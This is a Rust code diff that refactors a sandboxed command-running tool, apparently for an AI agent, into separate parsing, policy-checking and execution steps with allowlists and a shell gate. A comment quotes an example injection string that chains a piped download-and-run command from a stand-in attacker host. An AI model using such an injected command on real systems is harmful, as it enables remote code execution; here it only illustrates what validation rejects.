@@ -717,145 +717,221 @@ impl Tool for CmdRunTool {
         ctx: &ToolContext,
         args: serde_json::Value,
     ) -> Result<ToolResult, ToolError> {
-        // Phase 5 hardening: even when a caller reaches `CmdRunTool`
-        // directly (bypassing `ToolExecutor`'s category-level gate),
-        // `command.enabled = false` must refuse the invocation. The
-        // downstream `check_binary_allowlist` short-circuits to `Ok`
-        // when commands are disabled (so it doesn't second-guess the
-        // dispatcher), leaving this check as the only thing between
-        // a disabled config and a spawned process.
-        if !ctx.config.command.enabled {
+        let run_args = parse_run_args(&args, ctx);
+        enforce_command_policy(&run_args, ctx)?;
+        execute_run_command(run_args, ctx).await
+    }
+}
+
+/// Parsed `run_command` arguments after pulling them out of the JSON
+/// envelope. Pure data — every policy / allow-list decision lives in
+/// [`enforce_command_policy`] so the parser never returns a partially
+/// validated request.
+///
+/// Field semantics:
+/// - `cwd`: alias-resolved (`cwd` / `working_dir`); `None` ⇒ workspace root.
+/// - `timeout_ms`: `timeout_secs * 1000` if provided, else `timeout_ms`,
+///   else `ctx.config.sync_threshold_ms`.
+/// - `allow_shell`: per-call override or `ctx.config.command.allow_shell`.
+/// - `shell_script`: alias-resolved (`shell_script` / legacy `command`).
+/// - `program` + `cmd_args`: direct-spawn form. Mutually exclusive with
+///   `shell_script` (enforced in policy).
+struct RunArgs {
+    cwd: Option<String>,
+    timeout_ms: u64,
+    allow_shell: bool,
+    shell_script: Option<String>,
+    program: Option<String>,
+    cmd_args: Vec<String>,
+}
+
+/// Pull every `run_command` field out of the JSON envelope without
+/// applying any policy. Defaults match the original inline behavior:
+/// `cwd` / `working_dir` are aliased, `timeout_secs` overrides
+/// `timeout_ms`, and the legacy `command` field is treated as a
+/// `shell_script` alias.
+fn parse_run_args(args: &serde_json::Value, ctx: &ToolContext) -> RunArgs {
+    let cwd = args["cwd"]
+        .as_str()
+        .or_else(|| args["working_dir"].as_str())
+        .map(String::from);
+
+    let timeout_ms = if let Some(secs) = args["timeout_secs"].as_u64() {
+        secs * 1000
+    } else {
+        args["timeout_ms"]
+            .as_u64()
+            .unwrap_or(ctx.config.sync_threshold_ms)
+    };
+
+    let allow_shell = args["allow_shell"]
+        .as_bool()
+        .unwrap_or(ctx.config.command.allow_shell);
+
+    // The legacy `command` field is treated as a shell_script alias
+    // so the same gate applies. Callers shouldn't rely on it; the
+    // field remains only to avoid breaking older tool proposals.
+    let shell_script = args["shell_script"]
+        .as_str()
+        .or_else(|| args["command"].as_str())
+        .map(String::from);
+
+    let program = args["program"].as_str().map(String::from);
+    let cmd_args: Vec<String> = args["args"]
+        .as_array()
+        .map(|arr| {
+            arr.iter()
+                .filter_map(|v| v.as_str().map(String::from))
+                .collect()
+        })
+        .unwrap_or_default();
+
+    RunArgs {
+        cwd,
+        timeout_ms,
+        allow_shell,
+        shell_script,
+        program,
+        cmd_args,
+    }
+}
+
+/// Apply every policy gate to a parsed [`RunArgs`].
+///
+/// Mirrors the original inline ordering exactly so error messages don't
+/// shift between releases:
+/// 1. `command.enabled = false` is the outermost gate (Phase 5 hardening
+///    — refuses even when a caller reaches `CmdRunTool` directly,
+///    bypassing `ToolExecutor`'s category-level gate).
+/// 2. Shell-script branch: `allow_shell`, mutual-exclusion with
+///    `program` / `args`, `allowed_shell_scripts`,
+///    `command_allowlist`, then `binary_allowlist` against the first
+///    token (so an operator who's narrowed those lists sees consistent
+///    behavior with the direct-execution path).
+/// 3. Direct branch: presence of `program`, `validate_program_name`
+///    (rejects injection attempts before `which` masquerades them as
+///    `Forbidden`), then `command_allowlist` and `binary_allowlist`.
+fn enforce_command_policy(args: &RunArgs, ctx: &ToolContext) -> Result<(), ToolError> {
+    if !ctx.config.command.enabled {
+        return Err(ToolError::Forbidden(
+            "command execution disabled; set ToolConfig::command.enabled=true \
+             and populate binary_allowlist to opt in"
+                .into(),
+        ));
+    }
+
+    if let Some(script) = &args.shell_script {
+        if !args.allow_shell {
+            return Err(ToolError::InvalidArguments(
+                "'shell_script' requires allow_shell=true (per-call or in ToolConfig)".into(),
+            ));
+        }
+        if args.program.is_some() || !args.cmd_args.is_empty() {
+            return Err(ToolError::InvalidArguments(
+                "'shell_script' is mutually exclusive with 'program' / 'args'".into(),
+            ));
+        }
+        // Empty `allowed_shell_scripts` means "all shell scripts
+        // allowed" once `allow_shell == true` has been granted, to
+        // match the documented empty-allowlist convention shared
+        // with `command_allowlist` and `binary_allowlist`. A
+        // non-empty list switches back to strict verbatim-match
+        // enforcement so operators who pin specific scripts keep
+        // the original behavior.
+        if !ctx.config.command.bypass_allowlists
+            && !ctx.config.command.allowed_shell_scripts.is_empty()
+            && !ctx
+                .config
+                .command
+                .allowed_shell_scripts
+                .iter()
+                .any(|s| s == script)
+        {
             return Err(ToolError::Forbidden(
-                "command execution disabled; set ToolConfig::command.enabled=true \
-                 and populate binary_allowlist to opt in"
+                "shell_script not present in ToolConfig::command.allowed_shell_scripts; \
+                 operator must opt in by listing the script verbatim"
                     .into(),
             ));
         }
-
-        let cwd = args["cwd"]
-            .as_str()
-            .or_else(|| args["working_dir"].as_str())
-            .map(String::from);
-
-        let timeout_ms = if let Some(secs) = args["timeout_secs"].as_u64() {
-            secs * 1000
-        } else {
-            args["timeout_ms"]
-                .as_u64()
-                .unwrap_or(ctx.config.sync_threshold_ms)
-        };
-
-        let allow_shell = args["allow_shell"]
-            .as_bool()
-            .unwrap_or(ctx.config.command.allow_shell);
-
-        // The legacy `command` field is treated as a shell_script alias
-        // so the same gate applies. Callers shouldn't rely on it; the
-        // field remains only to avoid breaking older tool proposals.
-        let shell_script = args["shell_script"]
-            .as_str()
-            .or_else(|| args["command"].as_str())
-            .map(String::from);
-
-        let program = args["program"].as_str().map(String::from);
-        let cmd_args: Vec<String> = args["args"]
-            .as_array()
-            .map(|arr| {
-                arr.iter()
-                    .filter_map(|v| v.as_str().map(String::from))
-                    .collect()
-            })
-            .unwrap_or_default();
-
-        if let Some(script) = shell_script {
-            // Shell-script path — strictest gate.
-            if !allow_shell {
-                return Err(ToolError::InvalidArguments(
-                    "'shell_script' requires allow_shell=true (per-call or in ToolConfig)".into(),
-                ));
-            }
-            if program.is_some() || !cmd_args.is_empty() {
-                return Err(ToolError::InvalidArguments(
-                    "'shell_script' is mutually exclusive with 'program' / 'args'".into(),
-                ));
-            }
-            // Empty `allowed_shell_scripts` means "all shell scripts
-            // allowed" once `allow_shell == true` has been granted, to
-            // match the documented empty-allowlist convention shared
-            // with `command_allowlist` and `binary_allowlist`. A
-            // non-empty list switches back to strict verbatim-match
-            // enforcement so operators who pin specific scripts keep
-            // the original behavior.
-            if !ctx.config.command.bypass_allowlists
-                && !ctx.config.command.allowed_shell_scripts.is_empty()
-                && !ctx
-                    .config
-                    .command
-                    .allowed_shell_scripts
-                    .iter()
-                    .any(|s| s == &script)
-            {
-                return Err(ToolError::Forbidden(
-                    "shell_script not present in ToolConfig::command.allowed_shell_scripts; \
-                     operator must opt in by listing the script verbatim"
-                        .into(),
-                ));
-            }
-            // Still run allow-list checks against the first token so
-            // an operator who's narrowed `command_allowlist` /
-            // `binary_allowlist` sees consistent behavior.
-            check_command_allowlist(
-                &script,
-                ctx.config.command.bypass_allowlists,
-                &ctx.config.command.command_allowlist,
-            )?;
-            if let Some(first) = script.split_whitespace().next() {
-                check_binary_allowlist(
-                    first,
-                    ctx.config.command.enabled,
-                    ctx.config.command.bypass_allowlists,
-                    &ctx.config.command.binary_allowlist,
-                )?;
-            }
-
-            let sandbox = ctx.sandbox.clone();
-            return super::spawn_blocking_tool(move || {
-                cmd_run_shell_script(&sandbox, &script, cwd.as_deref(), timeout_ms)
-            })
-            .await;
-        }
-
-        // Direct-execution path (no shell).
-        let program = program.ok_or_else(|| {
-            ToolError::InvalidArguments(
-                "missing 'program' argument; use 'shell_script' for shell commands".into(),
-            )
-        })?;
-
-        // Validate the raw string BEFORE the allow-list checks so that
-        // injection attempts (`"ls; curl attacker | sh"`) surface as
-        // `InvalidArguments` rather than a downstream `which` failure
-        // masquerading as `Forbidden`.
-        validate_program_name(&program)?;
-
         check_command_allowlist(
-            &program,
+            script,
             ctx.config.command.bypass_allowlists,
             &ctx.config.command.command_allowlist,
         )?;
-        check_binary_allowlist(
-            &program,
-            ctx.config.command.enabled,
-            ctx.config.command.bypass_allowlists,
-            &ctx.config.command.binary_allowlist,
-        )?;
-
-        let sandbox = ctx.sandbox.clone();
-        super::spawn_blocking_tool(move || {
-            cmd_run(&sandbox, &program, &cmd_args, cwd.as_deref(), timeout_ms)
-        })
-        .await
+        if let Some(first) = script.split_whitespace().next() {
+            check_binary_allowlist(
+                first,
+                ctx.config.command.enabled,
+                ctx.config.command.bypass_allowlists,
+                &ctx.config.command.binary_allowlist,
+            )?;
+        }
+        return Ok(());
     }
+
+    let program = args.program.as_deref().ok_or_else(|| {
+        ToolError::InvalidArguments(
+            "missing 'program' argument; use 'shell_script' for shell commands".into(),
+        )
+    })?;
+
+    // Validate the raw string BEFORE the allow-list checks so that
+    // injection attempts (`"ls; curl attacker | sh"`) surface as
+    // `InvalidArguments` rather than a downstream `which` failure
+    // masquerading as `Forbidden`.
+    validate_program_name(program)?;
+
+    check_command_allowlist(
+        program,
+        ctx.config.command.bypass_allowlists,
+        &ctx.config.command.command_allowlist,
+    )?;
+    check_binary_allowlist(
+        program,
+        ctx.config.command.enabled,
+        ctx.config.command.bypass_allowlists,
+        &ctx.config.command.binary_allowlist,
+    )?;
+
+    Ok(())
+}
+
+/// Spawn the actual process via `spawn_blocking_tool`, dispatching to
+/// either the shell-script or direct-execution path.
+///
+/// Precondition: `enforce_command_policy(&args, ctx)` returned `Ok`.
+/// The defensive `ok_or_else` for `program` covers a future refactor
+/// that forgets to call the policy helper; it surfaces the same
+/// `InvalidArguments` message as the policy gate would.
+async fn execute_run_command(args: RunArgs, ctx: &ToolContext) -> Result<ToolResult, ToolError> {
+    let RunArgs {
+        cwd,
+        timeout_ms,
+        shell_script,
+        program,
+        cmd_args,
+        ..
+    } = args;
+
+    let sandbox = ctx.sandbox.clone();
+
+    if let Some(script) = shell_script {
+        return super::spawn_blocking_tool(move || {
+            cmd_run_shell_script(&sandbox, &script, cwd.as_deref(), timeout_ms)
+        })
+        .await;
+    }
+
+    let program = program.ok_or_else(|| {
+        ToolError::InvalidArguments(
+            "missing 'program' argument; use 'shell_script' for shell commands".into(),
+        )
+    })?;
+
+    super::spawn_blocking_tool(move || {
+        cmd_run(&sandbox, &program, &cmd_args, cwd.as_deref(), timeout_ms)
+    })
+    .await
 }
 
 #[cfg(test)]
